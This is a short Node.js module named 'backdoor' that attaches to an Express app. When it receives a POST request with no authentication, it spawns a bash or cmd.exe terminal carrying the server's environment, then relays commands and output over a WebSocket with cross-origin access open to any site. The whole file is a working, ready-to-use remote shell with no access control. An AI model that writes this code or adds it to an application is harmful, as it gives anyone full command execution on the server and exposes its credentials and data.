var expressWs = require('express-ws');
var os = require('os');
var pty = require('node-pty');

module.exports = backdoor;

function backdoor(app, options) {
  expressWs(app);
  var path = options.path;

  var terminals = {},
    logs = {};

  app.post(path, function (req, res) {
    var cols = parseInt(req.query.cols),
      rows = parseInt(req.query.rows),
      term = pty.spawn(process.platform === 'win32' ? 'cmd.exe' : 'bash', [], {
        name: 'xterm-color',
        cols: cols || 80,
        rows: rows || 24,
        cwd: process.env.PWD,
        env: process.env
      });

    terminals[term.pid] = term;
    logs[term.pid] = '';
    term.on('data', function (data) {
      logs[term.pid] += data;
    });

    res.header('Access-Control-Allow-Origin', '*');
    res.send(term.pid.toString());
    res.end();
  });

  app.post(path + '/:pid/size', function (req, res) {
    var pid = parseInt(req.params.pid),
      cols = parseInt(req.query.cols),
      rows = parseInt(req.query.rows),
      term = terminals[pid];

    term.resize(cols, rows);
    res.header('Access-Control-Allow-Origin', '*');
    res.end();
  });

  app.ws(path + '/:pid', function (ws, req) {
    var term = terminals[parseInt(req.params.pid)];
    ws.send(logs[term.pid]);

    term.on('data', function (data) {
      try {
        ws.send(data);
      } catch (ex) {
        // The WebSocket is not open, ignore
      }
    });
    ws.on('message', function (msg) {
      term.write(msg);
    });
    ws.on('close', function () {
      term.kill();
      // Clean things up
      delete terminals[term.pid];
      delete logs[term.pid];
    });
  });
}